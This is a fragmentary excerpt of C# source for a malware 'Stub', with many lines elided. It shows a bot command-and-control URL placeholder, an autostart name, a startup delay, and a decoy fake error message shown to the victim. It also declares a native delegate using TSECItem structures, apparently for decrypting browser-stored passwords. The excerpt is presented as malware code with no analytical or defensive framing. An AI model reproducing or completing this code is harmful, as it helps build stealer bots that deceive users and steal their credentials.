namespace Stub
{
    ...
    internal class Stub
    {
        ...
        private static string AutostartName = "AutoStart.exe";
        private static string BotServer = "https://Host/Webpanel/connect.php";
        ...
        private static string DelayTime = "Delay";
        ...
        private static string FakeErrorMessage = "FakeErrorMessage";
        private static string FakeErrorTitle = "FakeErrorTitle";
        ...
        private static void Main(string[] args)
        {
            ...
            if (createdNew)
            {
                if (FakeError)
                {
                    try
                    {
                        new Thread(new ThreadStart(Stub.tFakeError)).Start();
                    }
                    catch
                    {
                    }
        ...
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate5(ref Stub.TSECItem data, ref Stub.TSECItem result, int cx);
